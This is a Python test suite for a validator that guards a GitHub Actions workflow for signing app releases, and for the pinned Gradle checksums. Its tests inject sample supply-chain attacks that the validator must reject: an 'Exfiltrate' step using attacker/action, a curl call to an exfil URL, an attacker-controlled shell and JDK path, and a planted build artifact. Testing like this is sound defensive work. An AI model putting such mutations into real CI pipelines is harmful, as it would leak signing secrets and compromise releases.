from __future__ import annotations

import unittest
import xml.etree.ElementTree as ET
from pathlib import Path

from scripts.signed_candidate_workflow_security import (
    validate_signed_candidate_workflow,
)


ROOT = Path(__file__).resolve().parents[3]


class SignedCandidateWorkflowSecurityTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        cls.workflow = (
            ROOT / ".github/workflows/signed-candidate.yml"
        ).read_text(encoding="utf-8")

    def assert_rejected(self, mutated: str, needle: str) -> None:
        failures = validate_signed_candidate_workflow(mutated)
        self.assertTrue(
            any(needle in failure for failure in failures),
            failures,
        )

    def test_repository_workflow_passes(self) -> None:
        self.assertEqual(validate_signed_candidate_workflow(self.workflow), [])

    def test_gradle_wrapper_distribution_is_checksum_pinned(self) -> None:
        properties = (
            ROOT / "gradle/wrapper/gradle-wrapper.properties"
        ).read_text(encoding="utf-8")
        self.assertIn(
            "distributionUrl=https\\://services.gradle.org/distributions/"
            "gradle-9.7.0-bin.zip\n",
            properties,
        )
        self.assertIn(
            "distributionSha256Sum="
            "84fbba45c7f4c64abc77460e1c00f541e9f960e3c7ed2538f1ede19eacd873ae\n",
            properties,
        )

    def test_gradle_dependency_artifacts_are_checksum_pinned(self) -> None:
        namespace = "{https://schema.gradle.org/dependency-verification}"
        root = ET.parse(ROOT / "gradle/verification-metadata.xml").getroot()
        artifacts = root.findall(f".//{namespace}artifact")
        self.assertGreater(len(artifacts), 1000)
        for artifact in artifacts:
            checksums = artifact.findall(f"{namespace}sha256")
            self.assertEqual(len(checksums), 1, artifact.get("name"))
            self.assertRegex(checksums[0].get("value", ""), r"^[0-9a-f]{64}$")

    def test_automatic_or_flow_trigger_is_rejected(self) -> None:
        self.assert_rejected(
            self.workflow.replace(
                "  workflow_dispatch:\n",
                "  workflow_dispatch:\n  push: {}\n",
                1,
            ),
            "trigger must be exactly manual",
        )

    def test_top_or_job_permission_override_is_rejected(self) -> None:
        self.assert_rejected(
            self.workflow.replace(
                "permissions:\n  contents: read\n",
                "permissions: write-all\n",
                1,
            ),
            "permissions must be exactly",
        )
        self.assert_rejected(
            self.workflow.replace(
                "    runs-on: macos-26\n",
                "    permissions: write-all\n    runs-on: macos-26\n",
                1,
            ),
            "must not override permissions",
        )

    def test_wrong_guard_or_signing_dependency_is_rejected(self) -> None:
        self.assert_rejected(
            self.workflow.replace(
                "github.ref == 'refs/heads/master'",
                "github.ref == 'refs/heads/main'",
                1,
            ),
            "unsigned build job lacks",
        )
        self.assert_rejected(
            self.workflow.replace("    needs: build-unsigned\n", "", 1),
            "must depend on build-unsigned",
        )

    def test_mutable_or_unapproved_action_is_rejected(self) -> None:
        self.assert_rejected(
            self.workflow.replace(
                "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
                "actions/checkout@v7",
                1,
            ),
            "not pinned to its approved commit",
        )
        self.assert_rejected(
            self.workflow.replace(
                "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
                "attacker/action@3d3c42e5aac5ba805825da76410c181273ba90b1",
                1,
            ),
            "not pinned to its approved commit",
        )

    def test_build_secret_and_duplicate_secret_are_rejected(self) -> None:
        self.assert_rejected(
            self.workflow.replace(
                "    runs-on: macos-26\n",
                "    env:\n      BAD: ${{ secrets.BAD }}\n    runs-on: macos-26\n",
                1,
            ),
            "unsigned build job must never reference secrets",
        )
        binding = (
            "          NIMBO_ANDROID_KEYSTORE_B64: "
            "${{ secrets.NIMBO_ANDROID_UPLOAD_KEYSTORE_B64 }}\n"
        )
        self.assert_rejected(
            self.workflow.replace(binding, binding + binding, 1),
            "must occur exactly once",
        )

    def test_xtrace_variants_and_continue_on_error_are_rejected(self) -> None:
        self.assert_rejected(
            self.workflow.replace("          set +x\n", "          set -o xtrace\n", 1),
            "shell tracing is forbidden",
        )
        self.assert_rejected(
            self.workflow.replace(
                "          set +x\n          set -euo pipefail\n",
                "          set -euxo pipefail\n",
                1,
            ),
            "shell tracing is forbidden",
        )
        self.assert_rejected(
            self.workflow.replace(
                "        shell: bash\n",
                "        continue-on-error: true\n        shell: bash\n",
                1,
            ),
            "continue-on-error is forbidden",
        )

    def test_secret_step_without_early_xtrace_disable_is_rejected(self) -> None:
        self.assert_rejected(
            self.workflow.replace(
                "          set +x\n          set -euo pipefail\n",
                "          set -euo pipefail\n          set +x\n",
                1,
            ),
            "disable xtrace before strict mode",
        )

    def test_secret_step_custom_shell_is_rejected(self) -> None:
        self.assert_rejected(
            self.workflow.replace(
                "      - name: Upload-sign Android phone and Wear bundles\n"
                "        shell: bash\n",
                "      - name: Upload-sign Android phone and Wear bundles\n"
                "        shell: /tmp/attacker-shell {0}\n",
                1,
            ),
            "run step shell differs from policy",
        )

    def test_secret_step_extra_environment_is_rejected(self) -> None:
        self.assert_rejected(
            self.workflow.replace(
                "        env:\n"
                "          NIMBO_ANDROID_STORE_PASSWORD:",
                "        env:\n"
                "          JAVA_HOME: /tmp/attacker-jdk\n"
                "          NIMBO_ANDROID_STORE_PASSWORD:",
                1,
            ),
            "secret-consuming step env differs from policy",
        )

    def test_anchor_flow_and_extra_steps_are_rejected(self) -> None:
        self.assert_rejected(
            self.workflow.replace("        env:\n", "        env: &signing_env\n", 1),
            "anchors and aliases are forbidden",
        )
        self.assert_rejected(
            self.workflow.replace(
                "  sign-verify:\n",
                "  attacker: {}\n  sign-verify:\n",
                1,
            ),
            "flow mappings/lists",
        )
        self.assert_rejected(
            self.workflow.replace(
                "      - name: Destroy ephemeral signing material\n",
                "      - name: Exfiltrate\n"
                "        uses: attacker/action@main\n"
                "      - name: Destroy ephemeral signing material\n",
                1,
            ),
            "signing step inventory differs",
        )

    def test_post_secret_run_body_change_is_rejected(self) -> None:
        self.assert_rejected(
            self.workflow.replace(
                "          package = receipt.get(\"package\", {})\n",
                "          package = receipt.get(\"package\", {})\n"
                "          curl https://example.invalid/exfil\n",
                1,
            ),
            "signing run block differs from policy",
        )

    def test_mutable_repository_verifier_execution_is_rejected(self) -> None:
        self.assert_rejected(
            self.workflow.replace(
                "          python3 -I -B - \\\n",
                "          python3 scripts/verify_signed_candidate.py \\\n",
                1,
            ),
            "must not execute mutable repository Python directly",
        )

    def test_reviewed_verifier_digest_change_is_rejected(self) -> None:
        self.assert_rejected(
            self.workflow.replace(
                "1294eec2eb8a0c0a1ff928bf2963a46dcbc600b42eaa840c53f3c5ec537956fa",
                "0" * 64,
                1,
            ),
            "reviewed verifier digest pin count differs",
        )

    def test_unsigned_package_body_change_is_rejected(self) -> None:
        self.assert_rejected(
            self.workflow.replace(
                "          cp \"$NIMBO_SOURCE_ROOT/iosApp/ExportOptions.plist\" \\\n",
                "          cp \"$NIMBO_SOURCE_ROOT/iosApp/ExportOptions.plist\" \\\n"
                "          cp /tmp/attacker.aab \"$NIMBO_UNSIGNED_ROOT/phone-unsigned.aab\"\n",
                1,
            ),
            "unsigned build run block differs from policy",
        )

    def test_final_upload_path_expansion_is_rejected(self) -> None:
        self.assert_rejected(
            self.workflow.replace(
                "          path: |\n"
                "            ${{ runner.temp }}/nimbo-signed-candidate-package/signed-candidate-bytes.tar.gz\n"
                "            ${{ runner.temp }}/nimbo-signed-candidate-package/signed-candidate-receipt.json\n",
                "          path: ${{ runner.temp }}\n",
                1,
            ),
            "signing action step blocks differ from policy",
        )

    def test_any_unmodeled_workflow_mutation_is_rejected(self) -> None:
        self.assert_rejected(
            self.workflow.replace(
                "name: Signed release candidate\n",
                "name: Signed release candidate changed\n",
                1,
            ),
            "workflow bytes differ from the reviewed canonical policy",
        )


if __name__ == "__main__":
    unittest.main()
